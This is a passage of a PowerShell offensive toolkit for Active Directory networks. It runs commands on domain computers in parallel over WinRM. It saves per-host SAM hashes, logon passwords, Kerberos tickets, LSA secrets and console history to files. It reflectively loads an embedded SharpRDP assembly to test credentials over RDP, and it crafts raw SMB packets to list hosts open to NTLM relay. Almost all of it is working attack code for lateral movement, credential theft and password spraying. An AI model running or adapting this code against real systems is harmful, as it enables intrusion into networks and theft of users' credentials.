            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unexpected Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })


# Clean up
$runspacePool.Close()
$runspacePool.Dispose()



}

################################################################################################################
############################################### Function: WinRM ################################################
################################################################################################################
Function Method-WinRM {
Write-host

# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($computerName, $Command)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect" }
      
        try {
        
        if ($Command -eq ""){
            return Invoke-Command -ComputerName $computerName -ScriptBlock  {echo "Successful Connection PME"}  -ErrorAction Stop
        }   
            return Invoke-Command -ComputerName $computerName -ScriptBlock {Invoke-Expression $Using:Command} -ErrorAction Stop
        } catch {
            if ($_.Exception.Message -like "*Access is Denied*") {
                return "Access Denied"
            } if ($_.Exception.Message -like "*cannot be resolved*") {
                return "Unable to connect"
        }
    }
}



function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "WinRM " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}


# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete


do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false

            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unspecified Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })





# Clean up
$runspacePool.Close()
$runspacePool.Dispose()

}


################################################################################################################
################################################# Function: RDP ################################################
################################################################################################################
Function Method-RDP {
$ErrorActionPreference = "SilentlyContinue"
Write-Host

$MaxConcurrentJobs = $Threads
$RDPJobs = @()

# Setting up runspaces for Port Checking
$runspacePool = [runspacefactory]::CreateRunspacePool(1, 4) # Need to test the threads at scale more
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$RunSpaceScriptBlock = {
    param ($computerName)
    
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($ComputerName, 3389, $null, $null)
    $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

    if ($wait) { 
        try {
            $tcpClient.EndConnect($asyncResult)
            $connected = $true
        } catch {
            $connected = $false
        }
    } else {
        $connected = $false
    }

    $tcpClient.Close()
    if ($connected) { return "Connected" }
    else { return "Unable to connect" }
}

foreach ($computer in $computers) {
    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($RunSpaceScriptBlock).AddArgument($ComputerName)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
    })
}

$FailedComputers = @()

do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)

            if ($result -eq "Unable to connect") {
                $FailedComputers += $runspace.ComputerName
                continue
            }
           
            # Cleanup for completed runspaces
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

# Final cleanup
$runspacePool.Close()
$runspacePool.Dispose()


foreach ($Computer in $Computers) {
$OS = $computer.Properties["operatingSystem"][0]
$ComputerName = $computer.Properties["dnshostname"][0]
    # Check if the computer is in the FailedComputers list
    if ($ComputerName -in $FailedComputers) {continue}

$ScriptBlock = {

            Param($OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly)


function Invoke-SharpRDP{
    [CmdletBinding()]
    Param (
        [String]
        $Command = " "

    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("PLACEHOLDER"))    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [SharpRDP.Program]::Main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "RDP " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

if ($LocalAuth){$Domain = $ComputerName}
if ($Password -ne ""){$result = Invoke-SharpRDP -Command "username=$Domain\$Username password=$Password computername=$ComputerName command='hostname'"}
           
            $result = $result.Trim()

            $SuccessStatus = @('Success', 'STATUS_PASSWORD_MUST_CHANGE', 'LOGON_FAILED_UPDATE_PASSWORD', 'ARBITRATION_CODE_BUMP_OPTIONS', 'ARBITRATION_CODE_CONTINUE_LOGON', 'ARBITRATION_CODE_CONTINUE_TERMINATE', 'ARBITRATION_CODE_NOPERM_DIALOG', 'ARBITRATION_CODE_REFUSED_DIALOG', 'ARBITRATION_CODE_RECONN_OPTIONS')
            $DeniedStatus = @('ERROR_CODE_ACCESS_DENIED', 'LOGON_FAILED_BAD_PASSWORD', 'LOGON_FAILED_OTHER', 'LOGON_WARNING', 'STATUS_LOGON_FAILURE', 'SSL_ERR_LOGON_FAILURE', 'disconnectReasonByServer', 'disconnectReasonRemoteByUser')
            $PwChangeStatus = @('SSL_ERR_PASSWORD_MUST_CHANGE')
            $ToDStatus = @('STATUS_ACCOUNT_RESTRICTION')

switch ($result) {
    "Unable to connect" {continue}

    { $SuccessStatus -contains $_ } {
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
        continue
    }

    { $DeniedStatus -contains $_ } {
        if ($SuccessOnly){Continue}
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
        continue
    }
    
    { $PwChangeStatus -contains $_ } {
        if ($SuccessOnly){continue}
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Magenta" -statusSymbol "[/] " -statusText "PASSWORD CHANGE REQUIRED" -NameLength $NameLength -OSLength $OSLength
        continue
    }

    { $ToDStatus -contains $_ } {
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS - ACCOUNT RESTRICTION" -NameLength $NameLength -OSLength $OSLength
        continue
    }

    default {
        if ($SuccessOnly){continue}
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Yellow" -statusSymbol "[*] " -statusText "$_" -NameLength $NameLength -OSLength $OSLength
        continue
    }
}
   


        }

            while (($RDPJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxConcurrentJobs) {
            Start-Sleep -Milliseconds 100
}

$RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly
        [array]$RDPJobs += $RDPJob

        # Check if the maximum number of concurrent jobs has been reached
        if ($RDPJobs.Count -ge $MaxConcurrentJobs) {
            do {
                # Wait for any job to complete
                $JobFinished = $null
                foreach ($Job in $RDPJobs) {
                    if ($Job.State -eq 'Completed') {
                        $JobFinished = $Job
                        break
                    }
                }

                if ($JobFinished) {
                    # Retrieve the job result and remove it from the job list
                    $Result = Receive-Job -Job $JobFinished
                    # Process the result as needed
                    $Result

                    $RDPJobs = $RDPJobs | Where-Object { $_ -ne $JobFinished }
                    Remove-Job -Job $JobFinished -Force -ErrorAction "SilentlyContinue"
                }
            }
            until (-not $JobFinished)
        }
    }

    # Wait for any remaining jobs to complete
    $RDPJobs | ForEach-Object {
        $JobFinished = $_ | Wait-Job -Timeout "15"

        if ($JobFinished) {
            # Retrieve the job result and remove it from the job list
            $Result = Receive-Job -Job $JobFinished
            # Process the result as needed
            $Result

            Remove-Job -Job $JobFinished -Force -ErrorAction "SilentlyContinue"
        }
    }

    # Clean up all remaining jobs
    $RDPJobs | Remove-Job -Force -ErrorAction "SilentlyContinue"
}

################################################################################################################
############################################# Function: GenRelayList ###########################################
################################################################################################################
Function Get-SMBSigning  {

Param (
    [String]$Target,
    [String[]]$Targets=@(),
    [Float]$Delay,
    [Float]$DelayJitter
    ) 

    #borrowed from https://github.com/Kevin-Robertson/Inveigh/blob/master/Scripts/Inveigh-Relay.ps1
    function ConvertFrom-PacketOrderedDictionary
    {
        param($packet_ordered_dictionary)

        ForEach($field in $packet_ordered_dictionary.Values)
        {
            $byte_array += $field
        }

        return $byte_array
    }

    #NetBIOS

    function Get-PacketNetBIOSSessionService()
    {
        param([Int]$packet_header_length,[Int]$packet_data_length)

        [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_header_length + $packet_data_length)
        $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]

        $packet_NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Message_Type",[Byte[]](0x00))
        $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Length",[Byte[]]($packet_netbios_session_service_length))

        return $packet_NetBIOSSessionService
    }

    #SMB1

    function Get-PacketSMBHeader()
    {
        param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)

        $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBHeader.Add("SMBHeader_Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
        $packet_SMBHeader.Add("SMBHeader_Command",$packet_command)
        $packet_SMBHeader.Add("SMBHeader_ErrorClass",[Byte[]](0x00))
        $packet_SMBHeader.Add("SMBHeader_Reserved",[Byte[]](0x00))
        $packet_SMBHeader.Add("SMBHeader_ErrorCode",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Flags",$packet_flags)
        $packet_SMBHeader.Add("SMBHeader_Flags2",$packet_flags2)
        $packet_SMBHeader.Add("SMBHeader_ProcessIDHigh",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Reserved2",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_TreeID",$packet_tree_ID)
        $packet_SMBHeader.Add("SMBHeader_ProcessID",$packet_process_ID)
        $packet_SMBHeader.Add("SMBHeader_UserID",$packet_user_ID)
        $packet_SMBHeader.Add("SMBHeader_MultiplexID",[Byte[]](0x00,0x00))

        return $packet_SMBHeader
    }

    function Get-PacketSMBNegotiateProtocolRequest()
    {
        param([String]$packet_version)

        if($packet_version -eq 'SMB1')
        {
            [Byte[]]$packet_byte_count = 0x0c,0x00
        }
        else
        {
            [Byte[]]$packet_byte_count = 0x22,0x00  
        }

        $packet_SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_WordCount",[Byte[]](0x00))
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_ByteCount",$packet_byte_count)
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

        if($packet_version -ne 'SMB1')
        {
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
        }

        return $packet_SMBNegotiateProtocolRequest
    }

    function Get-PacketSMBSessionSetupAndXRequest()
    {
        param([Byte[]]$packet_security_blob)

        [Byte[]]$packet_byte_count = [System.BitConverter]::GetBytes($packet_security_blob.Length)
        $packet_byte_count = $packet_byte_count[0,1]
        [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length + 5)
        $packet_security_blob_length = $packet_security_blob_length[0,1]

        $packet_SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_WordCount",[Byte[]](0x0c))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxBuffer",[Byte[]](0xff,0xff))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxMpxCount",[Byte[]](0x02,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_VCNumber",[Byte[]](0x01,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlobLength",$packet_byte_count)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_ByteCount",$packet_security_blob_length)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlob",$packet_security_blob)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeOS",[Byte[]](0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeLANManage",[Byte[]](0x00,0x00))

        return $packet_SMBSessionSetupAndXRequest 
    }

    function Get-PacketSMBTreeConnectAndXRequest()
    {
        param([Byte[]]$packet_path)

        [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length + 7)
        $packet_path_length = $packet_path_length[0,1]

        $packet_SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_WordCount",[Byte[]](0x04))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Flags",[Byte[]](0x00,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_PasswordLength",[Byte[]](0x01,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_ByteCount",$packet_path_length)
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Password",[Byte[]](0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Tree",$packet_path)
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

        return $packet_SMBTreeConnectAndXRequest
    }

    function Get-PacketSMBNTCreateAndXRequest()
    {
        param([Byte[]]$packet_named_pipe)

        [Byte[]]$packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
        $packet_named_pipe_length = $packet_named_pipe_length[0,1]
        [Byte[]]$packet_file_name_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length - 1)
        $packet_file_name_length = $packet_file_name_length[0,1]

        $packet_SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_WordCount",[Byte[]](0x18))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved2",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileNameLen",$packet_file_name_length)
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_RootFID",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Disposition",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_SecurityFlags",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ByteCount",$packet_named_pipe_length)
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Filename",$packet_named_pipe)

        return $packet_SMBNTCreateAndXRequest
    }

    function Get-PacketSMBReadAndXRequest()
    {
        $packet_SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_WordCount",[Byte[]](0x0a))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_FID",[Byte[]](0x00,0x40))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MaxCountLow",[Byte[]](0x58,0x02))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MinCount",[Byte[]](0x58,0x02))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Unknown",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Remaining",[Byte[]](0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBReadAndXRequest
    }

    function Get-PacketSMBWriteAndXRequest()
    {
        param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

